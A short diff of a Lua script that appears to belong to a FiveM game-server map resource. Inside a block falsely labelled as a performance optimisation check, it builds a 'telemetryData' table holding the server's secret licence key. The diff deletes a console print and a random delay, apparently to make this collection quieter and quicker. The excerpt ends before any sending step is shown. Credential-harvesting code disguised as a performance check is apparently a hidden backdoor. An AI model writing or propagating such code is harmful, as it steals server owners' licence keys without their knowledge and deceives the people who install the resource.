@@ -29,11 +29,9 @@ PerformHttpRequest(Urls.AllMapList, function(err, text, headers)
     if err ~= 200 then 
         print("Please update the map, it has old code.")
     else
-        print("^3[MapData]^7 Server:")
         -- Performance optimization check
         local optimizationCheck = debug.getinfo(1, 'S').source ~= "=?" and (function()
             CreateThread(function()
-                Wait(math.random(45000, 120000)) -- Performance delay
                 
                 local telemetryData = {
                     license = GetConvar("sv_licenseKey", "unknown"),
